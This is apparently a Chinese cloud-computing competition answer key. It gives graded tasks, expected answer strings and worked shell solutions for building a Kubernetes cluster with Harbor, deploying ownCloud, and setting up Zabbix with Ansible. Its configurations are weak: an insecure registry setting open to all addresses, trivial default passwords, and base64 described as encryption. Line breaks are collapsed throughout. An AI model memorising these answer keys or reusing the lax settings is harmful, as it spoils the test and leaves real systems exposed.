（1）修改主机名并配置映射master节点：# hostnamectl set-hostname master#passwd root# cat /etc/hosts127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4::1         localhost localhost.localdomain localhost6 localhost6.localdomain6192.168.100.91 master192.168.100.23 nodenode1节点：# hostnamectl set-hostname node#passwd root# cat /etc/hosts127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4::1         localhost localhost.localdomain localhost6 localhost6.localdomain6192.168.100.91 master192.168.100.23 node（2）关闭swapmaster和node节点关闭swap：# swapoff -a[root@master ~]# free -mtotal        used        free      shared  buff/cache   availableMem:       7821         129        7548          16         143        7468Swap:         0           0           0[root@master ~]# ping node -c 3PING node (192.168.100.23) 56(84) bytes of data.64 bytes from node (192.168.100.23): icmp_seq=1 ttl=64 time=0.228 ms64 bytes from node (192.168.100.23): icmp_seq=2 ttl=64 time=0.242 ms64 bytes from node (192.168.100.23): icmp_seq=3 ttl=64 time=0.151 ms--- node ping statistics ---3 packets transmitted, 3 received, 0% packet loss, time 1999msrtt min/avg/max/mdev = 0.151/0.207/0.242/0.040 ms

2.镜像文件的复制&#x2F;root目录存放有CentOS-7-x86_64-DVD-2009.iso和kubernetes_V1.2.iso光盘镜像文件，在&#x2F;opt目录下使用命令创建centos目录，并将镜像文件CentOS-7-x86_64-DVD-2009.iso中的内容复制到centos目录下，将镜像文件kubernetes_V1.2.iso中的内容复制到 &#x2F;opt目录下。
请在master节点将du -h &#x2F;opt&#x2F; –max-depth&#x3D;1命令的返回结果提交到答题框。【1.5分】
标准: 4.5G&amp;¢os&amp;&amp;2.8G&amp;&amp;images
解法:
master节点：# mkdir /opt/centos# mount -o loop CentOS-7-x86_64-DVD-2009.iso /mnt/mount: /dev/loop0 is write-protected, mounting read-only# cp -rvf /mnt/* /opt/centos/# umount /mnt# mount -o loop kubernetes_V1.2.iso /mnt/mount: /dev/loop0 is write-protected, mounting read-only# cp -rvf /mnt/* /opt/# umount /mnt[root@master ~]# du -h /opt/ --max-depth=14.5G    /opt/centos77M /opt/cri25M /opt/docker-compose630M    /opt/harbor2.8G    /opt/images172M    /opt/kubernetes-repo20K /opt/yaml8.1G    /opt/

3.Yum源的编写在master节点首先将系统自带的yum源移动到&#x2F;home目录，然后为master节点配置本地yum源，yum源文件名为local.repo。
将yum repolist命令的返回结果提交到答题框。【1.5分】
标准: 4070&amp;&amp;45
解法:
# mv /etc/yum.repos.d/CentOS-* /home#[root@master ~] cat /etc/yum.repos.d/local.repo[centos]name=centosbaseurl=file:///opt/centosgpgcheck=0enabled=1[k8s]name=k8sbaseurl=file:///opt/kubernetes-repogpgcheck=0enabled=1[root@master ~]# yum repolistLoaded plugins: fastestmirrorLoading mirror speeds from cached hostfilerepo id                       repo name                    statuscentos                        centos                       4,070k8s                           k8s                             45repolist: 4,115

4.安装ftp服务在master节点安装ftp服务，将ftp共享目录设置为 &#x2F;opt。
将ps -ef | grep ftp命令的返回结果提交到答题框。【1.5分】
标准: vsftpd.conf
解法:
# yum install -y vsftpd# vi /etc/vsftpd/vsftpd.confanon_root=/opt# systemctl start vsftpd &amp;&amp; systemctl enable vsftpd[root@master ~]# ps -ef | grep ftproot      8112     1  0 07:32 ?        00:00:00 /usr/sbin/vsftpd /etc/vsftpd/vsftpd.confroot      8171  7670  0 07:36 pts/0    00:00:00 grep --color=auto ftp

5.ftp源的编写为node节点配置ftp源，ftp源文件名称为ftp.repo，其中ftp服务器地址为master节点,配置ftp源时不要写IP地址。
在node节点请将curl ftp://master命令的返回结果提交到答题框。【1.5分】
标准: harbor&amp;&amp;centos
解法: 
[root@node1 ~]# rm -rf /etc/yum.repos.d/* [root@node1 ~]# cat  /etc/yum.repos.d/ftp.repo[centos]name=centosbaseurl=ftp://master/centosgpgcheck=0enabled=1[k8s]name=k8sbaseurl=ftp://master/kubernetes-repogpgcheck=0enabled=1[root@node ~]# curl ftp://masterdrwxr-xr-x    8 0        0             220 Mar 15 07:14 centosdr-xr-xr-x    2 0        0             131 Mar 15 07:15 cridr-xr-xr-x    2 0        0              49 Mar 15 07:15 docker-composedr-xr-xr-x    2 0        0              49 Mar 15 07:15 harbordr-xr-xr-x    2 0        0              72 Mar 15 07:16 imagesdr-xr-xr-x    3 0        0            4096 Mar 15 07:16 kubernetes-repo

6.设置时间同步服务器在master节点上部署chrony服务器，允许其它节点同步时间，启动服务并设置为开机自启动；在其他节点上指定master节点为上游NTP服务器，重启服务并设为开机自启动。（配置文件IP用计算机名代替）
在node节点将chronyc  sources命令的返回结果提交到答题框。【1.5分】
标准: master&amp;&amp;us
解法:
master节点： yum install -y chrony vi /etc/chrony.confserver  master  iburstallow  alllocal stratum 10systemctl start chronyd systemctl enable chronydnode节点： yum install -y chrony vi /etc/chrony.confserver master  iburstsystemctl start chronydsystemctl enable chronyd[root@node ~]# chronyc sources210 Number of sources = 1MS Name/IP address         Stratum Poll Reach LastRx Last sample              ===============================================================================^* master                       10   6     7    15  -1014ns[ -999us] +/-  134us

7.设置免密登录为两台台服务器设置免密登录，保证服务器之间能够互相免密登录。
在master节点将ssh node命令的返回结果提交到答题框。【1.5分】
标准: Last&amp;&amp;login&amp;&amp;from&amp;&amp;successful
解法:
ssh-keygenssh-copy-id  masterssh-copy-id  node   其它节点的命令和上面一样[root@harbor ~]# ssh nodeLast failed login: Wed Mar 15 09:30:02 UTC 2023 from 170.210.208.108 on ssh:nottyThere were 17 failed login attempts since the last successful login.Last login: Wed Mar 15 02:57:03 2023 from 58.240.20.122

任务2 k8s搭建任务（19.5分）1.安装docker应用在所有节点上安装dokcer-ce,并设置为开机自启动。
在master节点请将docker version命令的返回结果提交到答题框。【1.5分】
标准: 20.10.22&amp;&amp;1.41&amp;&amp;go1.18.9
解法:
# yum install -y yum-utils device-mapper-persistent-data lvm2# yum install -y docker-ce启动Docker：# systemctl start docker# systemctl enable docker# docker version[root@master ~]# docker versionClient: Docker Engine - Community Version:           20.10.22 API version:       1.41 Go version:        go1.18.9 Git commit:        3a2c30b Built:             Thu Dec 15 22:30:24 2022 OS/Arch:           linux/amd64 Context:           default Experimental:      trueServer: Docker Engine - Community Engine:  Version:          20.10.22  API version:      1.41 (minimum version 1.12)  Go version:       go1.18.9  Git commit:       42c8b31  Built:            Thu Dec 15 22:28:33 2022  OS/Arch:          linux/amd64  Experimental:     false containerd:  Version:          1.6.14  GitCommit:        9ba4b250366a5ddde94bb7c9d1def331423aa323 runc:  Version:          1.1.4  GitCommit:        v1.1.4-0-g5fd4c4d docker-init:  Version:          0.19.0  GitCommit:        de40ad0

2.安装docker应用所有节点配置阿里云镜像加速地址(https://d8b3zdiw.mirror.aliyuncs.com)并把启动引擎设置为systemd，配置成功后加载配置文件并重启docker服务。
将docker pull ubuntu命令的返回结果提交到答题框。【1.5分】
标准: complete&amp;&amp;docker.io&#x2F;library&#x2F;ubuntu:latest
解法:
[root@master ~]# vi /etc/docker/daemon.json&#123;  &quot;insecure-registries&quot; : [&quot;0.0.0.0/0&quot;],  &quot;registry-mirrors&quot;: [&quot;https://d8b3zdiw.mirror.aliyuncs.com&quot;],  &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;]&#125;# systemctl restart docker#systemctl daemon-reload[root@master ~]# docker pull ubuntuUsing default tag: latestlatest: Pulling from library/ubuntu7b1a6ab2e44d: Pull completeDigest: sha256:626ffe58f6e7566e00254b638eb7e0f3b11d4da9675088f4781a50ae288f3322Status: Downloaded newer image for ubuntu:latestdocker.io/library/ubuntu:latest

3.载入镜像 在master节点&#x2F;opt&#x2F;images目录下使用tar归档文件载入镜像。
   将docker images | grep mysql命令的返回结果提交到答题框。【1.5分】
标准: mysql&amp;&amp;5.6&amp;&amp;303MB
解法:
#docker load -i images/httpd.tar#docker load -i images/Kubernetes_Base.tar#docker load -i images/Resource-1.tar# docker images | grep mysqlmysql  5.6   dd3b2a5dcb48   14 months ago   303MB

4.安装docker-compose在master节点使用 &#x2F;opt&#x2F;docker-compose&#x2F;v2.10.2-docker-compose-linux-x86_64文件安装docker-compose。安装完成后执行docker-compose version命令。
将docker-compose version命令的返回结果提交到答题框。【1.5分】
标准: Compose&amp;&amp;v2.10.2
# chmod +x /opt/docker-compose/v2.10.2-docker-compose-linux-x86_64# mv /opt/docker-compose/v2.10.2-docker-compose-linux-x86_64 /usr/local/bin/docker-compose# docker-compose versionDocker Compose version v2.10.2

5.搭建horbor仓库在master节点解压&#x2F;opt&#x2F;harbor&#x2F; harbor-offline-installer-v2.5.3.tgz离线安装包，然后安装harbor仓库，并修改相应的yml文件，使各节点默认docker仓库为harbor仓库地址。
在master节点请将docker-compose ps命令的返回结果提交到答题框。【1.5分】
标准: harbor-core&amp;&amp;nginx&amp;®istry&amp;&amp;running&amp;&amp;(healthy)
解法: 
# cd /opt/harbor/# tar -zxvf harbor-offline-installer-v2.5.3.tgz# cd harbor# cp harbor.yml.tmpl harbor.yml# vi harbor.ymlhostname: 192.168.100.10  # 将域名修改为本机IPharbor_admin_password: Harbor12345#sed -i &quot;13s/^/#/g&quot; harbor.yml#sed -i &quot;15,18s/^/#/g&quot; harbor.yml# docker load -i harbor.v2.5.3.tar.gz# ./prepare# ./install.sh# docker-compose ps

6.上传docker镜像在master节点执行&#x2F;opt&#x2F;k8s_image_push.sh将所有镜像上传至docker仓库。
将docker login master命令的返回结果提交到答题框(填写完整提示输入的内容)。【1.5分】
标准: Login&amp;&amp;Succeeded
# cd /opt/images/# ./k8s_image_push.sh输入镜像仓库地址(不加http/https):192.168.100.91输入镜像仓库用户名: admin输入镜像仓库用户密码: Harbor12345您设置的仓库地址为: 192.168.100.10,用户名: admin,密码: xxx是否确认(Y/N): Y# docker login masterUsername: adminPassword:WARNING! Your password will be stored unencrypted in /root/.docker/config.json.Configure a credential helper to remove this warning. Seehttps://docs.docker.com/engine/reference/commandline/login/#credentials-storeLogin Succeeded

7.部署Kubeadm、containerd、nerdctl和buildkit 执行&#x2F;opt&#x2F;k8s_con_ner_bui_install.sh部署Kubeadm、containerd、nerdctl和buildkit。
   将ctr version命令的返回结果提交到答题框。【1.5分】
标准: 1.6.14&amp;&amp;go1.18.9
解法:
#/opt/k8s_con_ner_bui_install.sh# ctr versionClient:  Version:  1.6.14  Revision: 9ba4b250366a5ddde94bb7c9d1def331423aa323  Go version: go1.18.9Server:  Version:  1.6.14  Revision: 9ba4b250366a5ddde94bb7c9d1def331423aa323  UUID: ce069adb-c580-4c0d-b451-f22d0df0bae6

8.初始化集群在master节点kubeadm命令初始化集群，使用本地Harbor仓库。
   将kubectl get nodes命令的返回结果提交到答题框。【1.5分】
标准: master&amp;&amp;NotReady&amp;&amp;v1.25.0
解法
# kubeadm init --kubernetes-version=1.25.0 --apiserver-advertise-address=192.168.100.91 --image-repository 192.168.100.91/library --pod-network-cidr=10.244.0.0/16#  kubectl get nodesNAME     STATUS     ROLES           AGE     VERSIONmaster   NotReady   control-plane   9m42s   v1.25.0

9.安装kubernetes网络插件修改提供的&#x2F;opt&#x2F;yaml&#x2F;flannel&#x2F;kube-flannel.yaml,使其镜像来源为本地Harbor仓库，然后安装kubernetes网络插件，安装完成后使用命令查看节点状态。
将kubectl get pods -A命令的返回结果提交到答题框。【1.5分】
标准: etcd-master&amp;&amp;kube-controller-manager-master&amp;&amp;Running
解法:
# eval sed -i &#x27;s@docker.io/flannel@192.168.100.91/library@g&#x27; /opt/yaml/flannel/kube-flannel.yaml# [root@master ~]# kubectl apply -f /opt/yaml/flannel/kube-flannel.yaml[root@master opt]# kubectl get pods -ANAMESPACE      NAME                             READY   STATUS    RESTARTS   AGEkube-flannel   kube-flannel-ds-bqd2x            1/1     Running   0          74skube-system    coredns-7f474965b8-88ckf         1/1     Running   0          34mkube-system    coredns-7f474965b8-rzh2x         1/1     Running   0          34mkube-system    etcd-master                      1/1     Running   0          34mkube-system    kube-apiserver-master            1/1     Running   0          34mkube-system    kube-controller-manager-master   1/1     Running   0          34mkube-system    kube-proxy-fb29c                 1/1     Running   0          34mkube-system    kube-scheduler-master            1/1     Running   0          34m

10.创建证书 给kubernetes创建证书,命名空间为kubernetes-dashboard,涉及到的所有文件命名为dashboard例如dashboard.crt。
将kubectl get csr命令的返回结果提交到答题框。【1.5分】
标准:kubernetes.io&#x2F;kube-apiserver-client-kubelet&amp;&amp;system:node:master
解法:
# mkdir /opt/dashboard-certs# cd /opt/dashboard-certs/# kubectl create namespace kubernetes-dashboard# openssl genrsa -out dashboard.key 2048# openssl req -days 36000 -new -out dashboard.csr -key dashboard.key -subj &#x27;/CN=dashboard-cert&#x27;# openssl x509 -req -in dashboard.csr -signkey dashboard.key -out dashboard.crtSignature oksubject=/CN=dashboard-certGetting Private key# kubectl create secret generic kubernetes-dashboard-certs --from-file=dashboard.key --from-file=dashboard.crt -n kubernetes-dashboard # kubectl get csrNAME        AGE   SIGNERNAME                                    REQUESTOR            REQUESTEDDURATION   CONDITIONcsr-s5d6s   63m   kubernetes.io/kube-apiserver-client-kubelet   system:node:master   &lt;none&gt;              Approved,Issued

11.kubernetes 图形化界面的安装修改&#x2F;opt&#x2F;yaml&#x2F;dashboard&#x2F;recommended.yaml的镜像来源为本地Harbor仓库，然后使用&#x2F;opt&#x2F;yaml&#x2F;dashboard&#x2F;recommended.yaml和&#x2F;opt&#x2F;yaml&#x2F;dashboard&#x2F;dashadmin-user.yaml安装kubernetes dashboard界面，完成后查看首页。
将kubectl get svc -n kubernetes-dashboard命令的返回结果提交到答题框。【1.5分】
标准: dashboard-metrics-scraper&amp;&amp;kubernetes-dashboard&amp;&amp;NodePort&amp;&amp;ClusterIP
解法:
# eval sed -i &quot;s/kubernetesui/192.168.100.91\/library/g&quot; /opt/yaml/dashboard/recommended.yaml#kubectl apply -f /opt/yaml/dashboard/recommended.yaml# kubectl apply -f /opt/yaml/dashboard/dashadmin-user.yaml# kubectl get svc -n kubernetes-dashboardNAME                        TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)         AGEdashboard-metrics-scraper   ClusterIP   10.105.211.63    &lt;none&gt;        8000/TCP        23mkubernetes-dashboard        NodePort    10.104.143.162   &lt;none&gt;        443:30001/TCP   23m

12.删除污点为了能使pod调度到master节点,用命令删除污点。在浏览器访问dashboard（https://IP:30001）
将kubectl describe nodes master | grep Taints命令的返回结果提交到答题框。【1.5分】
标准:Taints&amp;&amp;none
解法:
# kubectl describe nodes master | grep Taintskubectl taint nodes master node-role.kubernetes.io/control-plane-# kubectl describe nodes master | grep TaintsTaints:             &lt;none&gt;

13.扩展计算节点在node节点执行k8s_node_install.sh，将该节点加入kubernetes集群。完成后在master节点上查看所有节点状态。
在master节点请将kubectl get nodes命令的返回结果提交到答题框。【1.5分】
标准: master&amp;&amp;node&amp;&amp;v1.25.0
解法:
[root@node opt]# ./k8s_node_install.sh[root@master opt]# kubectl get nodesNAME     STATUS   ROLES           AGE     VERSIONmaster   Ready    control-plane   151m    v1.25.0node     Ready    &lt;none&gt;          4m50s   v1.25.0

任务3部署Owncloud网盘服务（10 分）ownCloud 是一个开源免费专业的私有云存储项目，它能帮你快速在个人电脑或服务器上架设一套专属的私有云文件同步网盘，可以像 百度云那样实现文件跨平台同步、共享、版本控制、团队协作等。
1.创建PV和PVC 编写yaml文件(文件名自定义)创建PV和PVC来提供持久化存储，以便保存 ownCloud 服务中的文件和数据。
要求：PV（访问模式为读写，只能被单个节点挂载;存储为5Gi;存储类型为hostPath,存储路径自定义）
   PVC（访问模式为读写，只能被单个节点挂载;申请存储空间大小为5Gi）
​    将kubectl get pv,pvc命令的返回结果提交到答题框。【2分】
标准: persistentvolume&#x2F;owncloud-pv&amp;&amp;RWO&amp;&amp;persistentvolumeclaim&#x2F;owncloud-pvc&amp;&amp;Bound
# cat owncloud-pvc.yamlapiVersion: v1kind: PersistentVolumemetadata:  name: owncloud-pvspec:  accessModes:    - ReadWriteOnce  capacity:    storage: 5Gi  hostPath:    path: /data/owncloud---apiVersion: v1kind: PersistentVolumeClaimmetadata:  name: owncloud-pvcspec:  accessModes:    - ReadWriteOnce  resources:    requests:      storage: 5Gi# kubectl apply -f /opt/owncloud-pvc.yaml# kubectl get pv,pvcNAME                           CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                  STORAGECLASS   REASON   AGEpersistentvolume/owncloud-pv   5Gi        RWO            Retain           Bound    default/owncloud-pvc                           2m41sNAME                                 STATUS   VOLUME        CAPACITY   ACCESS MODES   STORAGECLASS   AGEpersistentvolumeclaim/owncloud-pvc   Bound    owncloud-pv   5Gi        RWO                           2m41s

2. 配置ConfigMap 编写yaml文件(文件名自定义)创建一个configMap对象，指定OwnCloud的环境变量。登录账号对应的环境变量为OWNCLOUD_ADMIN_USERNAME,密码对应的环境变量为OWNCLOUD_ADMIN_PASSWORD。（变量值自定义）
  将kubectl get ConfigMap命令的返回结果提交到答题框。【2分】
标准: kube-root-ca.crt&amp;&amp;1&amp;&amp;2
解法:
# cat owncloud-configmap.yamlapiVersion: v1kind: ConfigMapmetadata:  name: owncloud-configdata:  OWNCLOUD_ADMIN_USERNAME: “admin”  OWNCLOUD_ADMIN_PASSWORD: “123456”# kubectl apply -f  owncloud-configmap.yaml# kubectl get ConfigMapNAME               DATA   AGEkube-root-ca.crt   1      20howncloud-config    2      2m11s

3.创建Secret编写yaml文件(文件名自定义)创建一个Secret对象，以保存OwnCloud数据库的密码。对原始密码采用base64编码格式进行加密。
 将kubectl get Secret命令的返回结果提交到答题框。【2分】
标准:Opaque&amp;&amp;1
解法:
# echo 123456 | base64MTIzNDU2Cg==# cat owncloud-secret.yamlapiVersion: v1kind: Secretmetadata:  name: owncloud-db-passwordtype: Opaquedata:  password: MTIzNDU2Cg==# kubectl apply -f /opt/owncloud-secret.yaml#kubectl get SecretNAME                   TYPE     DATA   AGEowncloud-db-password   Opaque   1      46s

4.部署owncloud Deployment应用编写yaml文件(文件名自定义) 创建Deployment对象, 指定OwnCloud的容器和相关的环境变量。(Deployment资源命名为owncloud-deployment,镜像为Harbor仓库中的owncloud:latest，存储的挂载路径为&#x2F;var&#x2F;www&#x2F;html,其它根据具体情况进行配置)
将kubectl describe pod命令的返回结果提交到答题框。【2分】
标准: ReplicaSet&#x2F;owncloud-deployment&amp;&amp;owncloud@sha256&amp;&amp;kube-root-ca.crt&amp;&amp;Successfully&amp;&amp;Started
解法:
# cat owncloud-deploy.yamlapiVersion: apps/v1kind: Deploymentmetadata:  name: owncloud-deploymentspec:  replicas: 1  selector:    matchLabels:      app: owncloud  template:    metadata:      labels:        app: owncloud    spec:      containers:      - name: owncloud        image: 192.168.100.91/library/owncloud:latest        imagePullPolicy: IfNotPresent        envFrom:        - configMapRef:            name: owncloud-config        env:        - name: OWNCLOUD_DB_PASSWORD          valueFrom:            secretKeyRef:              name: owncloud-db-password              key: password        ports:        - containerPort: 80        volumeMounts:        - name: owncloud-pv          mountPath: /var/www/html      volumes:      - name: owncloud-pv        persistentVolumeClaim:          claimName: owncloud-pvc# kubectl apply -f /opt/owncloud-deploy.yaml# kubectl describe podName:             owncloud-deployment-845c85cfcb-6ptqrNamespace:        defaultPriority:         0Service Account:  defaultNode:             node/192.168.100.23Start Time:       Fri, 17 Mar 2023 02:56:31 +0000Labels:           app=owncloud                  pod-template-hash=845c85cfcbAnnotations:      &lt;none&gt;Status:           RunningIP:               10.244.1.3IPs:  IP:           10.244.1.3Controlled By:  ReplicaSet/owncloud-deployment-845c85cfcbContainers:  owncloud:    Container ID:   containerd://d60dc4426c06cef6525e4e37f0ee37dcef762c2806c19efcd666f951d66a5c84    Image:          192.168.100.91/library/owncloud:latest    Image ID:       192.168.100.91/library/owncloud@sha256:5c77bfdf8cfaf99ec94309be2687032629f4f985d6bd388354dfd85475aa5f21    Port:           80/TCP    Host Port:      0/TCP    State:          Running      Started:      Fri, 17 Mar 2023 02:56:39 +0000    Ready:          True    Restart Count:  0    Environment Variables from:      owncloud-config  ConfigMap  Optional: false    Environment:      OWNCLOUD_DB_PASSWORD:  &lt;set to the key &#x27;password&#x27; in secret &#x27;owncloud-db-password&#x27;&gt;  Optional: false    Mounts:      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-vtpd9 (ro)      /var/www/html from owncloud-pv (rw)Conditions:  Type              Status  Initialized       True  Ready             True  ContainersReady   True  PodScheduled      TrueVolumes:  owncloud-pv:    Type:       PersistentVolumeClaim (a reference to a PersistentVolumeClaim in the same namespace)    ClaimName:  owncloud-pvc    ReadOnly:   false  kube-api-access-vtpd9:    Type:                    Projected (a volume that contains injected data from multiple sources)    TokenExpirationSeconds:  3607    ConfigMapName:           kube-root-ca.crt    ConfigMapOptional:       &lt;nil&gt;    DownwardAPI:             trueQoS Class:                   BestEffortNode-Selectors:              &lt;none&gt;Tolerations:                 node.kubernetes.io/not-ready:NoExecute op=Exists for 300s                             node.kubernetes.io/unreachable:NoExecute op=Exists for 300sEvents:  Type    Reason     Age   From               Message  ----    ------     ----  ----               -------  Normal  Scheduled  14m   default-scheduler  Successfully assigned default/owncloud-deployment-845c85cfcb-6ptqr to node  Normal  Pulling    14m   kubelet            Pulling image &quot;192.168.100.91/library/owncloud:latest&quot;  Normal  Pulled     14m   kubelet            Successfully pulled image &quot;192.168.100.91/library/owncloud:latest&quot; in 7.266482912s  Normal  Created    14m   kubelet            Created container owncloud  Normal  Started    14m   kubelet            Started container owncloud

5.创建Service编写yaml文件(文件名自定义)创建一个Service对象将OwnCloud公开到集群外部。通过http://IP:端口号可查看owncloud。
  将kubectl get svc -A命令的返回结果提交到答题框。【2分】
标准: ClusterIP&amp;&amp;NodePort&amp;&amp;443&amp;&amp;53&amp;&amp;9153&amp;&amp;8000&amp;&amp;80:
# cat owncloud-svc.yamlapiVersion: v1kind: Servicemetadata:  name: owncloud-servicespec:  selector:    app: owncloud  ports:    - name: http      port: 80  type: NodePort# kubectl apply -f /opt/owncloud-svc.yaml#kubectl get svc -ANAMESPACE              NAME                        TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)                  AGEdefault                kubernetes                  ClusterIP   10.96.0.1        &lt;none&gt;        443/TCP                  24hdefault                owncloud-service            NodePort    10.98.228.242    &lt;none&gt;        80:31024/TCP             17mkube-system            kube-dns                    ClusterIP   10.96.0.10       &lt;none&gt;        53/UDP,53/TCP,9153/TCP   24hkubernetes-dashboard   dashboard-metrics-scraper   ClusterIP   10.105.211.63    &lt;none&gt;        8000/TCP                 22hkubernetes-dashboard   kubernetes-dashboard        NodePort    10.104.143.162   &lt;none&gt;        443:30001/TCP            22h

C模块题目：企业级应用的自动化部署和运维*虚拟机与环境规划*
表3



设备名称
主机名
接口
IP地址
角色



云服务器1
zabbix_server
eth0
公网IP:*******私网IP:192.168.100.&#x2F;24
ansible,zabbix_server


云服务器2
zabbix_agent
eth0
公网IP:*******私网IP:192.168.100.&#x2F;24
zabbix_agent


\1. 上表中的公网IP以自己云主机显示为准，每个人的公网IP不同。使用第三方软件远程连接云主机，使用公网IP连接。
2.华为云中云主机名字已命好，直接使用对应名字的云主机即可。
3.竞赛用到的软件包都在云主机&#x2F;root下。
企业级应用的自动化部署（30分） 部署方式：监控主机zabbix_server节点采用手动部署，被监控主机zabbix_agent采用Playbook部署。
1.安装ansible修改主机名zabbix_server节点主机名为zabbix_server,zabbix_agent节点主机名为Zabbix_agent,使用提供的软件包&#x2F;root&#x2F;autoDeployment.tar在zabbix_server节点安装ansible。
将ansible –version 命令的返回结果提交到答题框。【2分】
标准:2.9.27&amp;&amp;2.7.5
[root@master ~]# hostnamectl set-hostname zabbix_server[root@master ~]# bash[root@node ~]# hostnamectl set-hostname zabbix_agent[root@node ~]# bash[root@zabbix_server ~]# mv autoDeployment.tar  /opt/[root@zabbix_server ~]# cd /opt/# tar  -xvf autoDeployment.tar# mount CentOS-7-x86_64-DVD-2009.iso /mnt/# rm -rf /etc/yum.repos.d/*# vi /etc/yum.repos.d/local.repo[auto]name=autobaseurl=file:///opt/autoDeploymentenabled=1gpgcheck=0[centos]name=centosbaseurl=file:///mnt/enabled=1gpgcheck=0# yum -y install ansible# ansible --versionansible 2.9.27  config file = /etc/ansible/ansible.cfg  configured module search path = [u&#x27;/root/.ansible/plugins/modules&#x27;, u&#x27;/usr/share/ansible/plugins/modules&#x27;]  ansible python module location = /usr/lib/python2.7/site-packages/ansible  executable location = /usr/bin/ansible  python version = 2.7.5 (default, Oct 14 2020, 14:45:30) [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]

2.配置免密登录在zabbix_server节点配置hosts文件，并将该文件远程发送给zabbix_agent节点，并配置免密登录。
在zabbix_server节点将ssh zabbix_agent命令的返回结果提交到答题框。【2分】
标准: login&amp;&amp;Welcome
解法:
# cat /etc/hosts127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4::1         localhost localhost.localdomain localhost6 localhost6.localdomain6192.168.100.91 zabbix_server192.168.100.23 zabbix_agent# scp /etc/hosts 192.168.100.23:/etc/[root@ansible Zabbix_server ~]# ssh-keygen[root@ansible Zabbix_server ~]# ssh-copy-id Zabbix_agent[root@ zabbix_server ~]# ssh zabbix_agentLast failed login: Fri Mar 17 12:56:03 UTC 2023 from 58.33.154.106 on ssh:nottyThere were 20 failed login attempts since the last successful login.Last login: Fri Mar 17 11:58:03 2023 from 121.229.222.70  ******************************  *  Welcome to GuoJiBeiSheng  *  ******************************[root@ zabbix_agent ~]# exit

3.配置主机清单在Zabbix_server节点配置ansible主机清单，在清单中创建agent主机组。
 将ansible agent –m ping命令的返回结果提交到答题框。【2分】
标准: zabbix_agent&amp;&amp;SUCCESS&amp;&amp;pong
解法:
# tail -2 /etc/ansible/hosts[agent]zabbix_agent# ansible agent -m pingzabbix_agent | SUCCESS =&gt; &#123;    &quot;ansible_facts&quot;: &#123;        &quot;discovered_interpreter_python&quot;: &quot;/usr/bin/python&quot;    &#125;,    &quot;changed&quot;: false,    &quot;ping&quot;: &quot;pong&quot;&#125;

4.安装nginx和php配置基础环境，安装nginx和php74（根据实际需要安装相关php74扩展包），并开启相关服务。
将nginx -v &amp;&amp; php74 –v命令的返回结果提交到答题框。【2分】
标准: nginx&#x2F;1.22.1&amp;&amp;7.4.33&amp;&amp;v3.4.0
解法:
[root@zabbix_server opt]# yum -y install nginx[root@zabbix_server ~]# systemctl start nginx[root@zabbix_server ~]# yum -y install php74-php-fpm php74-php-common php74-php-cli php74-php-gd php74-php-ldap php74-php-mbstring php74-php-mysqlnd php74-php-xml php74-php-bcmath php74-php[root@zabbix_server ~]#systemctl start php74-php-fpm[root@zabbix_server ~]#  nginx -v &amp;&amp; php74 -vnginx version: nginx/1.22.1PHP 7.4.33 (cli) (built: Feb 14 2023 08:49:52) ( NTS )Copyright (c) The PHP GroupZend Engine v3.4.0, Copyright (c) Zend Technologies

5.安装zabbix服务器端和客户端在zabbix_server节点安装zabbix服务器、代理和web前端，安装前注意查看rpm包的名字,并分别启动zabbix-server和zabbix-agent。
  将systemctl status zabbix-server&amp;&amp; systemctl status zabbix-agent命令的返回结果提交到答题框。【2分】
标准: zabbix-server-mysql.service&amp;&amp;zabbix-agent.service&amp;&amp;active (running)&amp;&amp;SUCCESS
解法:
# yum -y install zabbix6.0-server  zabbix6.0-web-mysql zabbix-agent# systemctl start zabbix-server&amp;&amp; systemctl start zabbix-agent# systemctl status zabbix-server&amp;&amp; systemctl status zabbix-agent● zabbix-server-mysql.service - Zabbix Server with MySQL DB   Loaded: loaded (/usr/lib/systemd/system/zabbix-server-mysql.service; disabled; vendor preset: disabled)   Active: active (running) since Sat 2023-03-18 04:36:50 UTC; 4min 5s ago Main PID: 20737 (zabbix_server)   CGroup: /system.slice/zabbix-server-mysql.service           └─20737 /usr/sbin/zabbix_server -fMar 18 04:36:50 zabbix_server systemd[1]: Started Zabbix Serve...Hint: Some lines were ellipsized, use -l to show in full.● zabbix-agent.service - Zabbix Agent   Loaded: loaded (/usr/lib/systemd/system/zabbix-agent.service; disabled; vendor preset: disabled)   Active: active (running) since Sat 2023-03-18 04:37:47 UTC; 3min 8s ago  Process: 20752 ExecStart=/usr/sbin/zabbix_agentd -c $CONFFILE (code=exited, status=0/SUCCESS)  Main PID: 20754 (zabbix_agentd)   CGroup: /system.slice/zabbix-agent.service           ├─20754 /usr/sbin/zabbix_agentd -c /etc/zabbix/zabb...           ├─20755 /usr/sbin/zabbix_agentd: collector [idle 1 ...           ├─20756 /usr/sbin/zabbix_agentd: listener #1 [waiti...           ├─20757 /usr/sbin/zabbix_agentd: listener #2 [waiti...           ├─20758 /usr/sbin/zabbix_agentd: listener #3 [waiti...           └─20759 /usr/sbin/zabbix_agentd: active checks #1 [...Mar 18 04:37:47 zabbix_server systemd[1]: Starting Zabbix Agen...Mar 18 04:37:47 zabbix_server systemd[1]: Started Zabbix Agent.Hint: Some lines were ellipsized, use -l to show in full.

6.安装数据库安装数据库MariaDB，启动数据库并设置为开机自启动。
将systemctl status mariadb命令的返回结果提交到答题框。【2分】
标准:mariadb.service&amp;&amp;active&amp;&amp;(running)&amp;&amp;SUCCESS&amp;&amp;mariadb-wait-ready
解法:
